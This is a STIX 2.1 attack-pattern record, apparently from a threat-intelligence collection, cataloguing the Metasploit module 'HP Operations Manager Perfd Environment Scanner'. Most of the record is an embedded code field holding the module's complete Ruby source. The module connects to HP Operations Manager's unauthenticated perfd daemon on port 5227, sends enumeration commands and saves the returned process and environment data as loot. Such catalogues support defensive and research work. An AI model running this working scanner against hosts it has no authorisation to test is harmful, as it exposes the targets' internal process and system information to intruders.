{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa133daa-5773-41e4-8889-5d323b260307",
    "created": "2024-08-14T16:31:43.280519Z",
    "modified": "2024-08-14T16:31:43.280523Z",
    "name": "HP Operations Manager Perfd Environment Scanner",
    "description": " This module will enumerate the process list of a remote machine by abusing HP Operation Manager's unauthenticated 'perfd' daemon. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/hp_enum_perfd.rb",
            "external_id": "hp_enum_perfd.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  # TODO: figure out what these do:\n  #   o: valid command, takes no args, does nothing\n  #   B, c, F, G, I, M, U, x: all require an \"instance id\" and possibly other args\n  ALLOWED_COMMANDS = %w(a A i g l p t T u w Z)\n\n  def initialize\n    super(\n      'Name'        => 'HP Operations Manager Perfd Environment Scanner',\n      'Description' => %q{\n        This module will enumerate the process list of a remote machine by abusing\n        HP Operation Manager's unauthenticated 'perfd' daemon.\n        },\n      'Author'      => [ 'Roberto Soares Espreto <robertoespreto[at]gmail.com>' ],\n      'License'     => MSF_LICENSE\n    )\n\n    commands_help = ALLOWED_COMMANDS.join(',')\n    register_options(\n    [\n      Opt::RPORT(5227),\n      OptString.new(\"COMMANDS\", [true, \"Command(s) to execute (one or more of #{commands_help})\", commands_help])\n    ])\n  end\n\n  def commands\n    datastore['COMMANDS'].split(/[, ]+/).map(&:strip)\n  end\n\n  def setup\n    super\n    if datastore['COMMANDS']\n      bad_commands = commands - ALLOWED_COMMANDS\n      unless bad_commands.empty?\n        fail ArgumentError, \"Bad perfd command(s): #{bad_commands}\"\n      end\n    end\n  end\n\n  def run_host(target_host)\n    begin\n\n      connect\n      banner_resp = sock.get_once\n      if banner_resp && banner_resp =~ /^Welcome to the perfd server/\n        banner_resp.strip!\n        print_good(\"#{target_host}:#{rport}, Perfd server banner: #{banner_resp}\")\n        perfd_service = report_service(host: rhost, port: rport, name: \"perfd\", proto: \"tcp\", info: banner_resp)\n        sock.puts(\"\\n\")\n\n        commands.each do |command|\n          sock.puts(\"#{command}\\n\")\n          Rex.sleep(1)\n          command_resp = sock.get_once\n\n          loot_name = \"HP Ops Agent perfd #{command}\"\n          path = store_loot(\n            \"hp.ops.agent.perfd.#{command}\",\n            'text/plain',\n            target_host,\n            command_resp,\n            nil,\n            \"HP Ops Agent perfd #{command}\",\n            perfd_service\n          )\n          print_status(\"#{target_host}:#{rport} - #{loot_name} saved in: #{path}\")\n        end\n      else\n        print_error(\"#{target_host}:#{rport}, Perfd server banner detection failed!\")\n      end\n      disconnect\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue Timeout::Error => e\n      print_error(e.message)\n    end\n  end\nend\n"
}